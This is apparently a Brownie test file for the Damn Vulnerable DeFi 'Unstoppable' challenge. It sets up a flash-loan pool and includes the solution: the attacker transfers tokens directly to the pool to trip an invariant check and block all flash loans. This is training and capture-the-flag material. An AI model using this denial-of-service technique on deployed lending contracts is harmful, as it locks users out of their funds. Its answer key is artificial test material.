from brownie import (accounts, Wei, DamnValuableToken,
                     UnstoppableLender, ReceiverUnstoppable)
import pytest

TOKENS_IN_POOL = Wei('1000000 ether')
INITIAL_ATTACKER_TOKEN_BALANCE = Wei('100 ether')


def test_unstoppable():
    # SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE

    deployer = accounts[0]
    attacker = accounts[1]
    someUser = accounts[2]

    token = DamnValuableToken.deploy({"from": deployer})
    pool = UnstoppableLender.deploy(token.address, {"from": deployer})

    token.approve(pool.address, TOKENS_IN_POOL, {"from": deployer})
    pool.depositTokens(TOKENS_IN_POOL, {"from": deployer})

    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, {
                   "from": deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE

    # Show that its possible for someUser to take out a flash loan
    receiver_contract = ReceiverUnstoppable.deploy(
        pool.address, {"from": someUser})
    receiver_contract.executeFlashLoan(10, {"from": someUser})

    # ** CODE YOUR EXPLOIT HERE **

    # SOLUTION:
    # assertion on line 39 in the pool contract will fail
    token.transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE,
                   {"from": attacker})

    # ** SUCCESS CONDITIONS **
    # It is no longer possible to take a flash loan
    with pytest.raises(AttributeError):
        receiver_contract.executeFlashLoan(10, {"from": someUser})
